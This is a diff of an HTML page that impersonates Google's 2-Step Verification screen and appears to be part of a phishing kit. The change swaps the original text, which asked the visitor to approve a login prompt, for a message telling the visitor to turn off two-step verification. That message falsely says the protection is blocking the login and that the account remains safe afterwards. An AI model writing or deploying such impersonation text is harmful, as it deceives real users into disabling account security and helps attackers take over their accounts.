@@ -100,7 +100,7 @@
                     <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
                 </div>
                 <h3 class="text-xl font-medium text-gray-900 mb-2">2-Step Verification</h3>
-                <p class="text-sm text-gray-600 mb-6">To help keep your account safe, Google wants to make sure it's really you trying to sign in with an android device click "yes it's me" to approve your login<br><br>Open the Gmail app Google sent a notification to your phone Open the Gmail app and tap Yes on the prompt to verify it's you.</p>
+                <p class="text-sm text-gray-600 mb-6">Go to your Gmail app, tap Manage your Google Account, then open Security, and turn off your Two-Step Verification because it's blocking your login. Google can't confirm it's you from here if your 2-step is on, which is why approval notifications aren't coming through. Once it's turned off, you'll be able to log in successfully.<br><br>Your account is safe after turning off your two-step verification. Try to login again after you've turned it off.</p>
                 
                 <span id="email-message" class="text-red-600 text-sm font-medium mb-4 hidden">Go to your email and approve your login</span>
                 
